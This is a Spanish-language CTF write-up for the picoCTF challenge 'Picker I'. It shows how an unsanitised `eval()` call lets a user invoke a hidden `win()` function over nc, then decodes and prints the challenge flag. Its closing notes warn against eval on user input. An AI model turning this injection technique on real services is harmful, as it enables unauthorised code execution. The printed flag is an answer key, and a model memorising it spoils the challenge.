**RETO:** Picker I

**DESCRIPCION:**  
This service can provide you with a random number, but can it do anything else? The program's source code can be downloaded here.

**SOLUCION:**

- Descargué el archivo picker-I.py que contenía el código fuente del servicio
    
- Analicé el código y encontré que usaba la función `eval()` para ejecutar entrada del usuario
    
- Identifiqué que había una función `win()` que leía y mostraba la flag
    
- El programa pedía al usuario que ingresara un nombre de función y luego ejecutaba `eval(user_input + '()')`
    
- Ingresé "win" como entrada para ejecutar la función `win()` y obtener la flag
    

**Proceso de solución:**

1. **Conectar al servicio:**
    
    bash
    
    nc saturn.picoctf.net 61957
    
2. **Ejecutar la función win:**
    
    text
    
    Try entering "getRandomNumber" without the double quotes...
    ==> win
    
3. **Obtener la flag en hexadecimal:**
    
    text
    
    0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d
    
4. **Convertir hexadecimal a texto:**
    
    python
    
    hex_values = "0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d".split()
    flag = ''.join(chr(int(h, 16)) for h in hex_values)
    print(flag)
    

**Flag:** `picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}`

**NOTAS:**

- El reto demostró los peligros de usar `eval()` con entrada del usuario sin sanitización
    
- La vulnerabilidad permitió la ejecución de funciones arbitrarias en el programa
    
- La función `win()` estaba disponible pero no era accesible directamente a través del flujo normal del programa
    
- La flag "4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b" significa "a diamond in the rough" en leet speak
    
- Nunca se debe usar `eval()` con entrada del usuario sin validación en aplicaciones de producción